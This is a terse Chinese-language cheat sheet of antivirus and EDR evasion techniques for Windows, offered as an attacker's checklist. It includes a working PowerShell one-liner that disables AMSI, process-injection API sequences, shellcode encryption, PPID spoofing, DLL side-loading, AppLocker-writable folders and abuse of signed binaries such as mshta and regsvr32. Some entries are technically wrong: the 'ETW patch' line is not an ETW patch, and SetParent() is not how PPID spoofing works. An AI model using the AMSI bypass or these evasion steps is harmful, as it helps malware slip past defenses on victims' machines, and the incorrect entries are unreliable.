# 免杀与规避

## 1. AMSI绕过

```powershell
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

## 2. ETW Patch

```csharp
NtSetInformationProcess(-1,ProcessTlsInformation,0,0)
```

## 3. DLL Unhooking

```
手动映射DLL
```

## 4. 进程注入

```csharp
VirtualAlloc()
WriteProcessMemory()
CreateRemoteThread()
```

## 5. Shellcode加密

```
XOR加密
AES加密
```

## 6. 进程伪装

```
修改进程名
盗用合法进程
```

## 7. PPID欺骗

```
SetParent()
```

## 8. DLL侧加载

```
白名单程序 + 恶意DLL
```

## 9. AppLocker绕过

```
受限目录
- C:\Windows\Tasks
- C:\Windows\Temp
- %USERPROFILE%
```

## 10. 签名二进制利用

```
使用已签名二进制
rundll32.exe
regsvr32.exe
mshta.exe
```

## 11. CLR注入

```
PowerShell加载C#
```
